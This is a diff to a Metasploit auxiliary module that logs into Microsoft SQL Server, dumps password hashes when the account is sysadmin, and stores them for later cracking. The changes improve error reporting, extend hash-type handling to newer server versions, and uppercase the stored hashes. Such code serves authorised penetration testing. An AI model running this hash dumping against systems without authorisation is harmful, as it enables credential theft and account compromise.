@@ -27,7 +27,12 @@ class MetasploitModule < Msf::Auxiliary
     if session
       set_session(session.client)
     elsif !mssql_login(datastore['USERNAME'], datastore['PASSWORD'])
-      print_error('Invalid SQL Server credentials')
+      info = self.mssql_client.initial_connection_info
+      if info[:errors] && !info[:errors].empty?
+        info[:errors].each do |err|
+          print_error(err)
+        end
+      end
       return
     end
 
@@ -79,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
 
     unless is_sysadmin == 0
       mssql_hashes = mssql_hashdump(version_year)
-      unless mssql_hashes.nil?
+      unless mssql_hashes.nil? || mssql_hashes.empty?
         report_hashes(mssql_hashes,version_year)
       end
     end
@@ -89,14 +94,12 @@ class MetasploitModule < Msf::Auxiliary
   # Stores the grabbed hashes as loot for later cracking
   # The hash format is slightly different between 2k and 2k5/2k8
   def report_hashes(mssql_hashes, version_year)
-
     case version_year
     when "2000"
       hashtype = "mssql"
-
     when "2005", "2008"
       hashtype = "mssql05"
-    when "2012", "2014"
+    else
       hashtype = "mssql12"
     end
 
@@ -106,12 +109,6 @@ class MetasploitModule < Msf::Auxiliary
           :name => 'mssql',
           :proto => 'tcp'
           )
-
-    tbl = Rex::Text::Table.new(
-      'Header'  => 'MS SQL Server Hashes',
-      'Indent'   => 1,
-      'Columns' => ['Username', 'Hash']
-    )
 
     service_data = {
         address: ::Rex::Socket.getaddress(mssql_client.peerhost,true),
@@ -125,12 +122,15 @@ class MetasploitModule < Msf::Auxiliary
       next if row[0].nil? or row[1].nil?
       next if row[0].empty? or row[1].empty?
 
+      username = row[0]
+      upcase_hash = "0x#{row[1].upcase}"
+
       credential_data = {
           module_fullname: self.fullname,
           origin_type: :service,
           private_type: :nonreplayable_hash,
-          private_data: "0x#{row[1]}",
-          username: row[0],
+          private_data: upcase_hash,
+          username: username,
           jtr_format: hashtype
       }
 
@@ -146,8 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       login_data.merge!(service_data)
       login = create_credential_login(login_data)
 
-      tbl << [row[0], row[1]]
-      print_good("Saving #{hashtype} = #{row[0]}:#{row[1]}")
+      print_good("Saving #{hashtype} = #{username}:#{upcase_hash}")
     end
   end
 
@@ -164,8 +163,7 @@ class MetasploitModule < Msf::Auxiliary
     case version_year
     when "2000"
       results = mssql_query(mssql_2k_password_hashes())[:rows]
-
-    when "2005", "2008", "2012", "2014"
+    else
       results = mssql_query(mssql_2k5_password_hashes())[:rows]
     end
 
